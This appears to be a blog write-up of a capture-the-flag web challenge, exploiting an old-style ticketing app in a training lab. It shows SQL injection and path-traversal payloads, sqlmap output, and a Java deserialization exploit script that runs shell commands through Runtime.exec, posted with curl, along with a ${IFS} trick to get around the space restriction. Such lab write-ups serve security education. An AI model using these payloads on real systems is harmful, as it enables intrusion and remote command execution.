+++
date = '2026-01-09'
draft = false
title = 'CyberEdu jargon Writeup'
ShowToc = true
tags = ["CyberEdu", "web"]
+++


## Challenge overview

This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit **[these outdated systems](https://app.cyber-edu.co/challenges/9fc6276f-ba87-4bc0-8277-b9640c3ce3de?tenant=cyberedu)** today, or has old-school web exploitation become harder in the modern landscape?

---

## Identifying the vulnerabilities

We can look at `/tickets?user=admin` by clicking tickets. Here we're given some hints:

![challenge-screenshot](ticket.png#center)

![challenge-screenshot](ticket2.png#center)

After attempting a simple `user=' OR 1=1--` SQL injection, it is successful. We end up finding three columns (`/tickets?user=' UNION SELECT 1,2,3--` works).

![challenge-screenshot](tickets3.png#center) 

These are our columns. But no flag. I tried with SQLmap as well:

```python
Table: tickets
[56 entries]
+----+-------+------------------------------------------------------------------------+
| id | name  | message                                                                |
+----+-------+------------------------------------------------------------------------+
| 1  | admin | Hello from seeded admin ticket #1                                      |
| 2  | admin | Hello from seeded admin ticket #2                                      |
| 3  | admin | Hello from seeded admin ticket #3                                      |
| 4  | admin | Hello from seeded admin ticket #4                                      |
| 5  | admin | Hello from seeded admin ticket #5                                      |
| 6  | admin | Hello from seeded admin ticket #6                                      |
| 7  | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 8  | admin | Hello from seeded admin ticket #8                                      |
| 9  | admin | Hello from seeded admin ticket #9                                      |
| 10 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) |
| 11 | admin | Hello from seeded admin ticket #11                                     |
| 12 | admin | Hello from seeded admin ticket #12                                     |
| 13 | admin | Reminder: db creds are admin:password123 (change before prod!)         |
| 14 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 15 | admin | Hello from seeded admin ticket #15                                     |
| 16 | admin | Hello from seeded admin ticket #16                                     |
| 17 | admin | API_KEY=sk_test_51JargonSuperLeaky17                                   |
| 18 | admin | Hello from seeded admin ticket #18                                     |
| 19 | admin | Hello from seeded admin ticket #19                                     |
| 20 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) |
| 21 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 22 | admin | Hello from seeded admin ticket #22                                     |
| 23 | admin | Hello from seeded admin ticket #23                                     |
| 24 | admin | Hello from seeded admin ticket #24                                     |
| 25 | admin | Hello from seeded admin ticket #25                                     |
| 26 | admin | Reminder: db creds are admin:password123 (change before prod!)         |
| 27 | admin | Hello from seeded admin ticket #27                                     |
| 28 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 29 | admin | Hello from seeded admin ticket #29                                     |
| 30 | admin | Internal note: Compiled jar is stored in /app/target/jargon.jar        |
| 31 | admin | Hello from seeded admin ticket #31                                     |
| 32 | admin | Hello from seeded admin ticket #32                                     |
| 33 | admin | Hello from seeded admin ticket #33                                     |
| 34 | admin | API_KEY=sk_test_51JargonSuperLeaky34                                   |
| 35 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 36 | admin | Hello from seeded admin ticket #36                                     |
| 37 | admin | Hello from seeded admin ticket #37                                     |
| 38 | admin | Hello from seeded admin ticket #38                                     |
| 39 | admin | Reminder: db creds are admin:password123 (change before prod!)         |
| 40 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) |
| 41 | admin | Hello from seeded admin ticket #41                                     |
| 42 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 43 | admin | Hello from seeded admin ticket #43                                     |
| 44 | admin | Hello from seeded admin ticket #44                                     |
| 45 | admin | Hello from seeded admin ticket #45                                     |
| 46 | admin | Hello from seeded admin ticket #46                                     |
| 47 | admin | Hello from seeded admin ticket #47                                     |
| 48 | admin | Hello from seeded admin ticket #48                                     |
| 49 | admin | SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');          |
| 50 | admin | DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132) |
| 51 | NULL  | NULL                                                                   |
+----+-------+------------------------------------------------------------------------+
```

We can try something else though. Through `http://34.159.240.221:32266/download?id=../../app/target/jargon.jar` we can download the .jar file. I ran `strings` on it and found this:

![challenge-screenshot](strings3.png#center)

I unzipped the file and moved to my main `ubuntu` machine, because kali *really* doesn't want me to install java on it. We can view the Classes, `App` and `Exploit` using `javap`, but I didn't like how they looked. 

So I installed `jd-gui` to view the classes better because `javap` was just very confusing for me and I like GUIs more, so sue me.

The vulnerabilities we're talking about are in Java Object Deserialization, which I wrote a short material about [here](irinasusca.github.io/writeup-blog/posts/serialization), in case you haven't heard about this concept before.

This deserialization was the most relevant and vulnerable part in `App.class`:


```java
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String ctype = req.getContentType();
    resp.setContentType("text/html");
    if (ctype != null && ctype.startsWith("application/octet-stream")) {
      try (ObjectInputStream ois = new ObjectInputStream((InputStream)req.getInputStream())) {
        Object obj = ois.readObject();
        resp.getWriter().println(header("Exploit") + 
        "<div class='bg-red-900 p-6 rounded'>
        <h2 class='text-xl font-bold text-red-300 mb-2'>
        [!] Deserialization Result</h2><p class='text-gray-200'>" + 
        obj.toString() + "</p></div>" + 
            footer());
      } catch (Exception e) {
        resp.getWriter().println(header("Error") + 
        "<p class='text-red-400'>Error: " + e
            .getMessage() + "</p>" + 
            footer());
      } 
    }
```

And here was `Exploit.Class`:

```java
package ctf.jargon;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Exploit implements Serializable {
  private static final long serialVersionUID = 1L;
  
  private String cmd;
  
  public Exploit(String cmd) {
    this.cmd = cmd;
  }
  
  private void readObject(ObjectInputStream in) throws IOException, 
  ClassNotFoundException {
    in.defaultReadObject();
    Runtime.getRuntime().exec(this.cmd);
  }
  
  public String toString() {
    return "Exploit triggered with command: " + this.cmd;
  }
}
```

Exploit basically runs a command, command that is passed as a String argument. It doesn't print the results out anywhere, though; First I tried with `"cat /flag.txt > /app/uploads/flag.txt"` but it didn't write the file; It did get parsed properly though.

![challenge-screenshot](cmd.png#center)

The way the `Runtime.exec()` expects is a String **ARRAY**, not just a single string, like we have; It splits it into tokens based on the spaces. Something like this : `exec(new String[]{"/bin/sh", "-c", "touch /tmp/empty.txt"});` would work.

That way, we just ran shell with the command `touch`. And that was it. It ignored the rest.

We would need a String[], we have String. How do we do this? ChatGPT said it's impossible. 

![challenge-screenshot](idiot.png#center)

It took me **SO SO LONG** to figure this out and I felt so stupid. I tried sending the most complex niche payloads possible, and then I thought, what if I just remove the spaces? Because that's how `Runtime.exec()` tokenizes? Guess what.

![challenge-screenshot](work.png#center)

Anyways, here's the script to generate and serialize the Object and run commands.

---

```sh
cat > SerializeExploit.java << 'EOF'
import ctf.jargon.Exploit;
import java.io.*;

public class SerializeExploit {
    public static void main(String[] args) throws Exception {
        // Write flag to uploads directory (where files are saved)
        Exploit exp = new Exploit("/bin/sh -c ls>/tmp/ls.txt ");
        
        FileOutputStream fos = new FileOutputStream("exploit.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(exp);
        oos.close();
        System.out.println("Serialized exploit to exploit.ser");
    }
}
EOF


javac -cp .:*.jar SerializeExploit.java

java -cp .:*.jar SerializeExploit

curl -X POST http://34.89.163.72:32050/contact \
  -H "Content-Type: application/octet-stream" \
  --data-binary @exploit.ser
  
curl http://34.89.163.72:32050/download?id=/tmp/ls.txt

```

We still can't enter spaces though, but then Claude helped and said we can replace them with `${IFS}`, some internal variable. `IFS` means Internal Field Separator, and it determines how the shell splits words, and it contains a space, tab, newline. So we get our space.


`ls${IFS}/>/tmp/ls.txt` showed a file named `flag-butlocationhastobesecret-1942e3.txt`, which then I showed with `cat${IFS}/flag-butlocationhastobesecret-1942e3.txt>/tmp/ls.txt`:

![challenge-screenshot](flag.png#center)









